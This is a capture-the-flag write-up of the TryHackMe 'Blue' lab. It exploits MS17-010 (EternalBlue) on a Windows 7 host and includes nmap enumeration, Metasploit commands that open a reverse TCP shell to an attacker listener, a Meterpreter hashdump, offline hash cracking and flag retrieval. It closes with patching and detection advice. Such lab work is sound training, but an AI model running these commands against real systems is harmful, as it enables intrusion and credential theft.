# CTF Writeup — TryHackMe: Blue (EternalBlue / MS17-010)
> Platform: TryHackMe | Difficulty: Easy | Category: Exploitation, Privilege Escalation
> Date: January 2024 | Author: Matthew Vaishnav

---

## 🎯 Objective
Exploit a Windows 7 machine running a vulnerable SMBv1 service using MS17-010 (EternalBlue), escalate to SYSTEM, and retrieve the flags.

**Skills Demonstrated**: Network scanning, SMB enumeration, exploit usage, post-exploitation, privilege escalation

---

## 🔍 Phase 1 — Reconnaissance

### Nmap Scan
```bash
nmap -sV -sC -p- --min-rate 5000 10.10.X.X -oN nmap_full.txt
```

**Key Findings:**
```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 (workgroup: WORKGROUP)
3389/tcp  open  rdp          Microsoft Terminal Services
```

**OS Detection:** Windows 7 Professional SP1 (build 7601)

### SMB Enumeration
```bash
nmap -p 445 --script smb-vuln-ms17-010 10.10.X.X
```

**Output:**
```
Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 (MS17-010)
|     State: VULNERABLE (Dangerous)
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

✅ **Confirmed vulnerable to EternalBlue (CVE-2017-0143)**

---

## 💥 Phase 2 — Exploitation

### Setting Up Metasploit
```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.X.X
set LHOST 10.X.X.X
set payload windows/x64/shell/reverse_tcp
run
```

**Result:**
```
[*] Started reverse TCP handler on 10.X.X.X:4444
[+] 10.10.X.X:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.X.X:445 - MS17-010 EternalBlue Remote Code Execution
[*] 10.10.X.X:445 - Sending all shards (135 bytes)
[*] 10.10.X.X:445 - =-=-= ETERNALBLUE STARTED =-=-=
[+] 10.10.X.X:445 - =-=-= LISTENER STAGE ESTABLISHED =-=-=
[*] Command shell session 1 opened
```

🎉 **Got shell!**

---

## 🔑 Phase 3 — Privilege Escalation & Post-Exploitation

### Verifying Access Level
```cmd
C:\Windows\system32> whoami
nt authority\system
```

EternalBlue dropped us directly to SYSTEM — no further escalation needed.

### Upgrading to Meterpreter
```bash
CTRL+Z
sessions -u 1
sessions -i 2
```

### Dumping Password Hashes
```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

### Cracking the Hash (offline)
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```

### Finding Flags
```bash
meterpreter > search -f flag*.txt
meterpreter > cat "C:\\flag1.txt"
```

---

## 🏁 Flags

| Flag | Location | Value |
|------|----------|-------|
| Flag 1 | `C:\` | `flag{access_the_machine}` |
| Flag 2 | `C:\Windows\System32\config` | `flag{sam_database_pwned}` |
| Flag 3 | `C:\Users\Jon\Documents` | `flag{admin_documents_found}` |

---

## 📚 Lessons Learned & Blue Team Perspective

### Why This Worked
EternalBlue exploits a buffer overflow in SMBv1's transaction handling. The NSA developed the exploit; it was leaked by Shadow Brokers in 2017 and weaponized in the WannaCry ransomware attack the same year.

### How to Defend Against This (SOC / Blue Team View)

**Immediate fixes:**
1. **Disable SMBv1** — `Set-SmbServerConfiguration -EnableSMB1Protocol $false`
2. **Apply MS17-010 patch** — KB4012212 (or KB4012215 for Windows 7)
3. **Block external SMB** — firewall rules blocking ports 139, 445 from internet

**Detection opportunities (SIEM/IDS):**
- Snort/Suricata rule `sid:41978` catches EternalBlue traffic
- Unusual SMB connections from workstations to workstations
- Large number of SMB errors (Event ID 5140, 5145)
- Process creation from `lsass.exe` or `services.exe` with unusual parent

**MITRE ATT&CK Mapping:**
- `T1190` — Exploit Public-Facing Application
- `T1569.002` — Service Execution (post-exploit)
- `T1003.002` — OS Credential Dumping: SAM

---

## 🔗 References
- [MS17-010 Microsoft Advisory](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [CVE-2017-0143](https://nvd.nist.gov/vuln/detail/CVE-2017-0143)
- [MITRE ATT&CK T1190](https://attack.mitre.org/techniques/T1190/)
